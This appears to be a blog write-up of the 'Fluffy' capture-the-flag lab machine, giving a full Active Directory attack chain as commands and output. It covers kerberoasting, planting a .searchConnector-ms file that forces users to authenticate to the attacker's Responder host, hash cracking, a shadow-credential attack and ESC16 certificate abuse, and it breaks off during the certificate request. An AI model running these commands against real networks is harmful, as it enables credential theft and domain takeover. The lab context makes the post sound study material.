---
layout: post
title: "fluffy"
date: 2025-10-07 
categories: ctf
---
# fluffy

# Summary

- We started with a valid user account
- use drop-sc method to drop a `.searchConnector-ms` file to force user who visit the IT dir to authenticate to our share on responder; capture user’s NTLMv2 hash
- crack hash with hashcat
- bloodhound to map out AD
- user has GenericAll over Service Account group, bloodyAD to add ourself to the group
- Service Account group has GenericWrite over ca_svc user, which is in the Cert Publish group
- use pywhisker, pkinit to retrieve ca_svc user’s NT hash
- user certipy-ad to find vulnerable certificates using ca_svc creds; ESC16 vulnerable
- exploit ESC16 to get Administrator NT hash

# Attack Path

We are given credential to access AD:

```bash
j.fleischman / J0elTHEM4n1990!
```

Let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/fluffy 10.10.11.69

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-07 14:57:48Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-07T14:59:10+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-07T14:59:10+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-10-07T14:59:10+00:00; +7h00m03s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-07T14:59:10+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

We get the domain name, the DNS server name, from the ports and services, this looks like a DC; let’s add them to our /etc/hosts file.

```bash
10.10.11.69 fluffy.htb DC01.fluffy.htb
```

First let’s verify whether this is the DC with nxc, and enumerate the shares we have access to:

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares

SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

We have confirmed this is indeed the domain controller. Let’s see what’s in the IT share.

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --spider IT --regex .

SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64 [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64.zip [lastm:'2025-05-16 10:51' size:1827464]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58 [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58.zip [lastm:'2025-05-16 10:51' size:3225346]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Upgrade_Notice.pdf [lastm:'2025-05-17 10:31' size:169963]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64/. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64/.. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64/everything.exe [lastm:'2025-05-16 10:51' size:2265104]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/Everything-1.4.1.1026.x64/Everything.lng [lastm:'2025-05-16 10:51' size:958342]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/.. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePass.chm [lastm:'2025-05-16 10:51' size:768478]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePass.exe [lastm:'2025-05-16 10:51' size:3305824]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePass.exe.config [lastm:'2025-05-16 10:51' size:763]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePass.XmlSerializers.dll [lastm:'2025-05-16 10:51' size:463264]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePassLibC32.dll [lastm:'2025-05-16 10:51' size:609136]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/KeePassLibC64.dll [lastm:'2025-05-16 10:51' size:785776]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Languages [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/License.txt [lastm:'2025-05-16 10:51' size:18710]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Plugins [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/ShInstUtil.exe [lastm:'2025-05-16 10:51' size:97128]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Languages/. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Languages/.. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Plugins/. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/Plugins/.. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/.. [dir]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_Common.xsl [lastm:'2025-05-16 10:51' size:2732]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl [lastm:'2025-05-16 10:51' size:3556]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl [lastm:'2025-05-16 10:51' size:3098]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl [lastm:'2025-05-16 10:51' size:919]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl [lastm:'2025-05-16 10:51' size:3100]

```

The most interesting thing looks to be in the XSL dir:

```bash
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_Common.xsl [lastm:'2025-05-16 10:51' size:2732]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl [lastm:'2025-05-16 10:51' size:3556]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl [lastm:'2025-05-16 10:51' size:3098]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl [lastm:'2025-05-16 10:51' size:919]
SMB         10.10.11.69     445    DC01             //10.10.11.69/IT/KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl 
```

Let’s download the PasswordOnly file:

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --share IT --get-file KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl KDBX_PasswordsOnly_TXT.xsl
```

Just a configuration file. 

Let’s map out the AD, since we already have a valid user credential.

```bash
mkdir bh_out
cd bh_out

bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 -d fluffy.htb -c all

sudo neo4j start
bloodhound
```

Now let’s search up our user:

![image.png]({{ site.baseurl }}/assets/fluffy/image.png)

We are not a member of any privileged groups, we also do not have any object outbound control. Let’s find kerberoastable accounts:

```bash
sudo ntpdate -u 10.10.11.69 
nxc ldap 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting kerberoasting.out

LDAP        10.10.11.69     389    DC01             [*] sAMAccountName: ca_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb'], pwdLastSet: 2025-04-17 12:07:50.136701, lastLogon: 2025-05-21 18:21:15.969274
	LDAP        10.10.11.69     389    DC01             $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb\ca_svc*$3a4bf645b9bd9d26bddbf9e12cbd87d0$d0ea9828b8dfe9f22575c117845b5008fa2417f068b4ed40b1a961517c6859cc9a6b1ee19e4dbee7add4741cf1128c215de49329b7e4e16ec5c010fcfcd79e0c9877e136f11001fe1d8c16a7b5f2b28236462ce867bc9936f0d88c706248b32e043c276db102d21e733f4dd522740d6dbcf2b444610e2ddd582edcec6610680b4e56a7f6a9e2d78f2d96678694b7ddf922b17ff79c578eed1ad65edd1d69a43d49b8c6c7cc77e3777dc3fdda2540d405bb4bd419a1b02f18a377c219c308653ae98ca979e90e7d1d61179486a5eb2d9ddbf1a26ea80f4c61839a0e4f3dc8ed1260667eabaae3f5051cb6a7d438af8b267f89ffe390793cf522e8b0a6b38fde217c99a84989759283143f8eda7b66b76800268e6845952f0a4d2b1b2d983c5fee38b772bce7029041192eed4b312e977a5f4a25e5b5f8ac99f510b58ee483332f477e16fcb04622cd78c8000391e4ef415d0ac2fd25ccadec4f692d784ab7247063cce11682849b237301434b345126f2c70c974f085e1d58cbf3811836dc5e7360e871cd3e524077701572f68aac7be6e02ebc35a639134a94bf83716e2052ffaef9502ce907ec002dd693544d089d59206b1f14ba5f63015afe525868d5d4c189bcc5a518868b8e015132cf07dcbea1008fe0fdc98dabad198b8afbe37101164fa58160be022fdb607e822f947c5c262871dcd4fa2fe77b086c69a5b70449b3c9fd9b76f026b21af2a89e202db4f1f73231752a68afb21b1cd1e026b4c6132ab27633469ccfd0181e1c13abf5a6b3618b9f8b2f27ae55de88e6df3adc5e8169c85cc92259b33fa189578d8a28c178028faebce7c186b2c81b7ed9af11941af37b86a4f71e122c4d20b5c608150e2e2cc57df3aec316dbd17e8e8725745cafff739d969259dab7ff7b19ab94bdeb92f0a5f738fbf1e3a5e63c0bfc671f94d96372207feb0d7b4580a40d0aa92495dfa9ff7c19b9e79753aded91b17476e89a870f25e18a27eedfc3b92cf5a78e8a51ca9a1a73faa7a1db993030fbbc3a4e6ce7e207fc1489f4508c75022c498b41b14c135c153164cdf90a1db191af5919e39f9cada2bec690e4a21bc2050747b67f80d646b90e6b985626b3b1a7e0fb041b8211439796b0fc67a27cbd52c4c4554fe50917afb08eec7116ae6f3dd4ea10d6c9c5378331d8f9be0ad86b167ff441a48e9b0754858cccbcb8ef4dae0dbf22dc75538cdb3d3672c6d8ee55290a81250104c94c00c5d7e7946cacf2cf86f45a5b39e250e43eebd4ba021d785350ae45cadda3b76e6d5cb801d87dedbd867dfc1114a615cc53f0dae7f802ad5aa3223216ef7649cfc3ff8a3869189b2727706125471a79713d2feddf42fcf6d4aff7c08d4efb35c8758811d83b4de41479bb278705915846282e16b0e02f4f44db11e1db60041267c7736470297681c6c0a2fd065128df6efbeb8ce549ea1409e53aa29bf5c141088c9564bf590da7e936c748904746f7a63e349f3b14742346270e18c79655e8bd740e06d6b1d9e4b1989ec41c141208c5eeed1172
LDAP        10.10.11.69     389    DC01             [*] sAMAccountName: ldap_svc, memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb, pwdLastSet: 2025-04-17 12:17:00.599545, lastLogon: <never>
LDAP        10.10.11.69     389    DC01             $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb\ldap_svc*$2582d1601b7d5c116f1dca35e7887dc7$72ccf969b5879392c3612b1c651cb688b974b737a95e6f0bc0826c44a93f3156395c71eff5d81712d2d96f5d307c86b96aaeb2c3e39a4ce94478838d3db92c6ec7fb3f395a7ae5eae1aa1a405e571308576ab9945b2081d4599401b5c979bb0bdd31036c8954dc8236567e7e69c6b5c532eba4beecdbe064d8df79294cec9d4c83ff4006fc122c471e0ec7c8bee589c9e13796805ba9c37c79400fbb85755ea3319403d24b1fa48a4a7e4b6ff6c06f64f99abfcffb0692ce77f100c7ed0b2755bcafee330548b7272323b3d9625864a52afe8d955e051d783859e970673e13fd8ac75a6b5957a7c05733641d3bff31afa58b471a5c1b6b695903ec80e3d53e913b7687d6faa83da043c4867a91c63c9c9887bc4d981751b2d37342e296e006c93d605e2573eee6678fbcb0e62528c81e97bc850a230c354e7f3fd8158754e03d867527056085bfd45d121ea4fb04838545d478fad2121da4f00f4843375c288492b3a49c97376a480a0ecc0eee10661b608f9f33a9998605651a48ca86ed4a65134adb2464d5f736545e8d3741138ba52d8bceffb1926eb73bb98a053fefab16054cf4003d1b9500bbf20192a9b04ef3adbb4bb69cd3db7ded346bde3ae7cf030953a0eef12e1812dc327479a33516e0977217b6548c5f60bae308ca883a4374bbd6188e342f0a1d40344bec12f1822578cc1da9efc53f6955486ec9842ff4df39683859be81131c21af92227908e075d516660ff4e60bf08ab69bc6706d4d58698ee148ac47175fcecd170adf035b9f68ecce7ff909bda558f6b698cc66d23f41359ec1c0c0dd6b8221900d5d4c8a38e9ff64400c9f1f11c42e7e4f7c89fa01bbe4afdc2df43f784ad4b3ca11808690169bcb3db7f5adbd2ac965f8b153fa1143604a7699e4ecd3d052aab8ff0d363205bc06b02fe975b8e9f94d204542bde6de0fb4c1bb2fb4cb114643ab1d2106237979b13675817a6ad0b827d855ad4329782f62263a8651ce1f8d1e86a6fa4c3811160f4a8c9502b08120cd635221b961d406b4b902b7164650b74cac92610ea6cdeb9b37ba8e033b88804ff71afe76902801557e0a49cf2a72b05f6312bacf11e33b18a2975a0ad4679278b79256f59fe007286359c8013174cb7725e6ab82014f64aca02fd804f4b58cfd3fe493194001462c99f097959e4fda385ae03a764e5ee147b475c9568e1d5386aa19fc9d174c42dab669f70c2ac976ba6bdc66fb19209b4ec4a929f3697e4d30272ede7a614bd0df490cdd7551e9f408d4d44d89e9aecaa013592288600526df1ceb55001ca3c6b29c9f53112858409dea3dc68502901b1a11ca532e030667aa02c86329b78971fc3307ac4c6af128b092efe39226ec7bf953dc0786f8160d2a5c4d4d50a0e0e2f3f86c9026a9b15b4086863d59040b6c0c16fec8829bddea76eda7d73b1c9d2eede370cc1166e545191f9a47a1494641a4e6ec1e93e259afd87636ef36b508a1eb9894e170ff69c0e4d999ed43bf3fcacb96a4c4f481dadf9e2975e299ea08e919ce79d596
LDAP        10.10.11.69     389    DC01             [*] sAMAccountName: winrm_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb'], pwdLastSet: 2025-05-17 20:51:16.786913, lastLogon: 2025-05-19 11:13:22.188468
LDAP        10.10.11.69     389    DC01             $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb\winrm_svc*$f6727e6555e08865e3035ff856e75afd$3227e405f08639706b3f047990dbffd02c9de71f15ea5b81f5a385b275f58f66a801fece3d518f9146cae0fcd362b5d69d68df9da1aee580f5b32a65c8a59fb0f0b3c0ebac829ecea2e3f5ef91898e6815b92390fa233c603637a8809fadb9fdd41dfc741994e5a291c788ca1b9412f01e1bd176637f1cd8f1be38e97367c59b6633f4693ee17ca57eac40709dac15f958b54056fcdf88eb4161693b1692832ff2140a6cc96954309c3ab3e91f7aa5679483911e4dda83f209055172893d496449e479915b2344c42e83279216a7e396b9f43ea8d86680f34b65538e624b08547ac0a29d808889d50165108fc95656c00cd19430147d9f2f16e7e0c15b7beadd04451f8836ac0ad44326b61966791311a9aa5edaaf6214f50385059421fe7f5a09213203ac6a4c6192d03354778d6e84e4757f7dc7872ba571447ea78c91ca4a8f0071c7b0bd2527f337450cf135b8d43723aa57e268813a3a35ea4d2d058cc54403653d4894811168f1a1ff44e7709f9ec97f994a504ce24be723ced872d63a8c34070c2488cec0ef52ef9e4d9cc0aabcbab29e0334e80bf7d78fe55f0214c5e14e1b571798cc5906bb68268cb9be39df185b995e1b1755775c11a8fe8bad556050d5892376eaeef31e5a8d543c234e63030705f839cf9623cf3f852ac4f7823e04af13e34227e7606fa946fdaa8cd6ef4efd1ed350078ab8a3ab5c62573a545f73f4ebf407bcf6a3a4e6c6e39c0281f9070b51afd3b1ee6df171fedf93f08bcc4e9946442130e1a7c89b03d0e0ec76f7d51fd46749187b3990a6ffe6975ffb599ff9be5c849138b2dacb55e88eca998f907d6da68ddb6265d4720ea1dea04f5fec839afd3394419e03f5b50ae1210959e9e1fc107692cb2863685fbc4acc404bb2fa281fcec86b4fd075be963f4cdb8ff831c79dcc4092ef5c7efc9f84f1a25dca91e0a162058cfa02afec316cb87a7d835283017cb3b11a89b2febb496a09b36c195323416ef4c496b97c06055edb64b8b56db87b4d761a35d4b072eaed74c491e41eac20d8ada90338974335b25801107706fa11c497d1e2ae4a738995cc98523f14c7dfba5df5ba3d4f69207fc92758e57354c1d46ec0c3713e056872c866974b21749d188a6cce01e0e64cae297f27ec86c6a304eb49dff2129c924f9bd64d2a8c08e262d61fec88ecb1c8d2978f251d91331ba7d8e1d7bb2fe4a1456d0f1fc3a2544af80fd3f58c0b69a836d40c7a69171fe427006334971241833d736ad7d31b599795aec5cb0e98297508a1a00cd18c13f873d60255bca82e5d5e80d25039c38eb89fb83b7b6c34ac50429b8a33ffc421578a3cf765edcfbe7eedfeb1162038f4d1760aa552abdec516f8dcd1a4cad36ee5aff7d001207ef09d3938f4a4a55f75ea942cd3ede076a65330589058be9d5916e94b92bf99d3932457ff6507178941ec04bd6c4a49dc491b3bae17758a05e8068a860ef4465fa603c790bbb907950b56301979bb2ebb2613b172a823d105cfeb5c7b3bcdcd9de3f80a680587d0cd907f1d

```

Let’s put the hashes in a file and attempt to crack the hashes in the background:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt 

.\hashcat.exe -m 13100 ..\hashes.txt --show
```

No result.

Let’s get user descriptions from LDAP:

```bash
nxc ldap 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' -M user-desc 

User:                     Description:
Administrator             Built-in account for administering the computer/domain
Guest                     Built-in account for guest access to the computer/domain
krbtgt                    Key Distribution Center Service Account
```

Since we have write permission, let’s also use the drop-sc module see if we can get another user’s hash when they access the IT dir; 
Windows Explorer (or other shell components) can automatically reach out and authenticate when it parses certain file types (including `.searchConnector-ms` / `.library-ms`) — e.g., when you open a folder, view the file in Explorer, or the preview/thumbnail/indexer touches it. That automatic behavior is why these file types are useful for forcing NTLM/SMB auth captures:

```bash
#start responder
sudo responder -I tun0

nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' -M drop-sc -o URL=\\\\10.10.16.9\\secret SHARE=IT FILENAME=secret
```

Let this run in the background.

After a while, we capture p.agila’s NTLM hash:

```bash
p.agila::FLUFFY:ff70aacbbfa58b4c:32837D5AC57D114374E8EC3F604CB966:0101000000000000808EEDB04237DC01E94022E1B3FF7054000000000200080048005A004A00330001001E00570049004E002D00480057004A00450049004F0037003600370058004C0004003400570049004E002D00480057004A00450049004F0037003600370058004C002E0048005A004A0033002E004C004F00430041004C000300140048005A004A0033002E004C004F00430041004C000500140048005A004A0033002E004C004F00430041004C0007000800808EEDB04237DC0106000400020000000800300030000000000000000100000000200000EDF19D2970415FD6B0445268881E9097D08C5F14FB4630DA4EA1F77C2BA2DEC60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0039000000000000000000
```

Let’s attempt to crack:

```bash
.\hashcat.exe -m 5600 ..\hashes.txt ..\rockyou.txt

p.agila:prometheusx-303
```

Let’s check her rights on bloodhound.

![image.png]({{ site.baseurl }}/assets/fluffy/image%201.png)

We have GenericAll over all service accounts; This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

![image.png]({{ site.baseurl }}/assets/fluffy/image%202.png)

![image.png]({{ site.baseurl }}/assets/fluffy/image%203.png)

This means we can add ourselves to the Service Accounts group:

```bash
net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.11.69"

OR

bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.10.11.69 add groupMember 'service accounts' p.agila
```

The most interesting member is the CA_SVC account.

![image.png]({{ site.baseurl }}/assets/fluffy/image%204.png)

Having GenericWrite over CA_SVC allow us to perform shadow credential attack; 
a Shadow Credential attack is an Active Directory (AD) persistence/credential-access technique where an attacker **adds certificate/key-based credentials** to a user or computer AD object (by modifying its `msDS-KeyCredentialLink` attribute). Those “shadow” keys let the attacker authenticate as that account (via Kerberos PKINIT) **without knowing the account password or NT hash**, enabling stealthy takeover and persistence.

```bash
python3 pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add" --filename ca_svc

[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1ef442b8-aa24-8d91-6cf6-72b6876d1348
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: ca_svc.pfx
[+] PFX exportiert nach: ca_svc.pfx
[i] Passwort für PFX: ZLHDf2tUraWsocxDeT6T
[+] Saved PFX (#PKCS12) certificate & key at path: ca_svc.pfx
[*] Must be used with password: ZLHDf2tUraWsocxDeT6T
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Now let’s get the NT hash:

```bash
sudo ntpdate -u 10.10.11.69 
python3 PKINITtools/gettgtpkinit.py -cert-pfx ca_svc.pfx -pfx-pass ZLHDf2tUraWsocxDeT6T fluffy.htb/ca_svc ca_svc.ccache

2025-10-07 12:20:03,850 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-10-07 12:20:03,863 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-10-07 05:20:15,704 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-10-07 05:20:15,705 minikerberos INFO     0b74f4e275d8ca8fbca8948ce1f7ca9cb6ff4141ca469765d2a23453ba67d074
INFO:minikerberos:0b74f4e275d8ca8fbca8948ce1f7ca9cb6ff4141ca469765d2a23453ba67d074
2025-10-07 05:20:15,707 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```bash
export KRB5CCNAME=ca_svc.ccache
sudo ntpdate -u 10.10.11.69 

python3 PKINITtools/getnthash.py -key 0b74f4e275d8ca8fbca8948ce1f7ca9cb6ff4141ca469765d2a23453ba67d074 fluffy.htb/ca_svc

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8

```

A faster way of getting the NT hash is using ceritpy-ad’s shadow function; only if the DC support PKINIT method:

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account ca_svc -dc-ip 10.10.11.69
```

We know ca_svc is part of cert publishers group; allows us to publish certificates.

Now let’s user certipy-ad to check for vulnerable certs:

```bash
certipy-ad find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -vuln

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

- **What the KDC accepts and why certificates matter**
    - Kerberos normally vouches for identity using tickets derived from a user’s password key (the NT hash) or from other authentication mechanisms. PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) is the certificate-based path: the client proves identity by presenting a certificate and proving possession of the associated private key during the initial TGT request.
    - For PKINIT to succeed, the KDC must be willing to map that certificate to a principal (user or computer). That mapping can be accomplished either because:
        - The account object in AD contains a stored public key/cert (the `msDS-KeyCredentialLink`) — i.e., a **shadow credential**, OR
        - The KDC implicitly trusts a CA and the certificate’s subject/UPN/SAN and EKU indicate the principal (subject name/UPN matches user, and the CA is trusted for that purpose).
- **What ESC16 is, at root**
    - ESC16 is a class of AD CS (Certificate Services) misconfigurations in templates/CA behavior that *allow a low-privilege principal to obtain a certificate that the domain/KDC will accept as belonging to another principal*. In other words, the CA/template will issue a cert whose subject/UPN maps to a high-value account, or it allows arbitrary subject names or lacks proper SID/subject binding checks.
    - That certificate + private key can then be used to perform PKINIT and obtain Kerberos tickets *as the target account*, without any password or NT hash.

To exploit, we follow the steps here: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

![image.png]({{ site.baseurl }}/assets/fluffy/image%205.png)

**Update the victim account's UPN to the target administrator's `sAMAccountName`:**

```bash
certipy-ad account \
    -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip '10.10.11.69' -upn 'administrator' \
    -user 'ca_svc' update
    
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```

**Request a certificate as the "victim" user from *any suitable client authentication template* (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):

```bash
export KRB5CCNAME=ca_svc.ccache
```

Then request the certificate:

```bash
sudo ntpdate -u 10.10.11.69 

certipy-ad req \
    -k -dc-ip '10.10.11.69' \
    -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' \
    -template 'User'
    
[*] Requesting certificate via RPC
